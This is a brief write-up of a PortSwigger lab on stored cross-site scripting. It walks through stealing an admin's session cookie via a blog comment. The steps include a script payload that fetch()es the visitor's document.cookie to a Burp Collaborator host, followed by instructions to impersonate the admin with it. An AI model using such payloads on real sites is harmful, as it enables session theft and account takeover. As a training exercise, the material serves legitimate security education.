# XSS - Exploiting cross-site scripting to steal cookies

## üìå Lab Details
- **Title**: Exploiting cross-site scripting to steal cookies
- **Difficulty**: Practitioner
- **Category**: Cross-site Scripting
- **Lab URL**: https://portswigger.net/academy/labs/launch/0c567d752c198d06a7a3e449249118740a13247871b21c6aab286522fe52f6aa?referrer=%2fweb-security%2fcross-site-scripting%2fexploiting%2flab-stealing-cookies

## üîç Summary
This lab has a stored XSS in blog comments. Inject a script that sends the victim's session cookie to Burp Collaborator. When the admin views the comment, their cookie is stolen. Use that cookie to impersonate the admin and access `/my-account` to solve the lab.

## üõ† Steps to Solve
1. Open **Burp Collaborator** and copy the URL: `q8z4bhubwqpi7ycna7wamc2kbbh25sth.oastify.com`
2. Inject the exploit comment:
   ```sh
   <script>
   fetch(https://q8z4bhubwqpi7ycna7wamc2kbbh25sth.oastify.com, {
   method: 'POST',
   mode: 'no-cors',
   body: document.cookie
   });
   </script>
3. Once the admin loads the comment, the script runs thier **browser**, and sends **their cookie** to Burp Collaborator.
4. Click **Poll now** in the Burp Collaborator.
5. Use the **admin's session cookie** to log in to the account.
   
## üìñ Key Takeaways
- **Burp Collaborator** lets you recieve external requests from victims.
- `document.cookie` gives you the victim's session if JavaScript runs.
- If you have someone's session cookie, you can impersonate them.
